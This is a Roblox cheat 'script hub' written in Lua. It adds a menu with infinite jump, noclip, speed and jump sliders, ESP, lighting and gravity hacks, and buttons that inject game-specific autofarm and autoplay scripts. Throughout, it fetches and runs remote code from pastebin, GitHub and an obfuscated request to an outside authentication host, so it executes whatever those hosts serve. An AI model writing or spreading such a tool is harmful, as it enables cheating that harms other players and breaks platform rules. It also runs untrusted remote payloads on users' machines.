local UILibrary = loadstring(game:HttpGet("https://pastebin.com/raw/V1ca2q9s"))()

local MainUI = UILibrary.Load("DevsHub")
local FirstPage = MainUI.AddPage("Home")
local SecondPage = MainUI.AddPage("Players")
local ThirdPage = MainUI.AddPage("World")
local FourthPage = MainUI.AddPage("Scripts")
local FithPage = MainUI.AddPage("Settings")

local Label1 = FirstPage.AddLabel("Home 1")

local Toggle1 = FirstPage.AddToggle("InfiniteJump", false, function(Value)
  _G.infinjump = Value

	local Player = game:GetService("Players").LocalPlayer
	local Mouse = Player:GetMouse()
	Mouse.KeyDown:connect(function(k)
		if _G.infinjump then
			if k:byte() == 32 then
				Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				Humanoid:ChangeState("Jumping")
				wait(0.1)
				Humanoid:ChangeState("Seated")
			end
		end
	end)

	local Player = game:GetService("Players").LocalPlayer
	local Mouse = Player:GetMouse()
	Mouse.KeyDown:connect(function(k)
		k = k:lower()
		if k == "f" then
			if _G.infinjump == true then
				_G.infinjump = false
			else
				_G.infinjump = true
			end
		end
	end)
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "Infinite Jump Toggled";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

local Button1 = FirstPage.AddButton("NoClip (e)", function()
    noclip = false
    game:GetService('RunService').Stepped:connect(function()
    if noclip then
    game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
    end
    end)
    plr = game.Players.LocalPlayer
    mouse = plr:GetMouse()
    mouse.KeyDown:connect(function(key)
 
    if key == "e" then
    noclip = not noclip
    game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
    end
    end)
    print('Loaded')
    print('Press "E" to noclip')
    end)
    
    local Button1 = FirstPage.AddButton("Key Teleport (v)", function()
    print("Hello")
end)

local Slider1 = FirstPage.AddSlider("WalkSpeed", {Min = 0, Max = 255, Def = 16}, function(Value)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
end)

local Slider1 = FirstPage.AddSlider("JumpPower", {Min = 0, Max = 255, Def = 50}, function(Value)
game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
end)

local Button2 = SecondPage.AddButton("ESP", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua",true))()
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "ESP Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

local Button3 = ThirdPage.AddButton("NoBlur", function()
    game.Lighting.Blur.Size = 0
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "NoBlur Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

local Button3 = ThirdPage.AddButton("NoFog", function()
     game.Lighting.FogEnd = 999999999
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "NoFog Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

local Button3 = ThirdPage.AddButton("LowGravity", function()
       game.Workspace.Gravity = 15
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "LowGravity Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

local Button3 = ThirdPage.AddButton("FullBright", function()
     for i,v in pairs(game:GetService("Lighting"):GetChildren()) do
		if v:IsA("PostEffect") then
			v:Destroy()
		end
        end
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "FullBright Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

local Button4 = FourthPage.AddButton("Jailbreak Autofarm", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/wawsdasdacx/ohascriptnrrewading/main/jbsaxcriptidk1"))();
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "Script Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

local Button4 = FourthPage.AddButton("Murder Mystery 2", function()
     getgenv().mainKey = "nil"
    local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "Script Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

local Button4 = FourthPage.AddButton("Pet Simulator X", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/si1nnx/psxx/main/g"))()
    game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "Scripts Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

local Button4 = FourthPage.AddButton("FunkyFriday Autoplayer", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
end)

local Button5 = FithPage.AddButton("DestroyGui", function()
    game.CoreGui.DevsHub:Remove()
end)
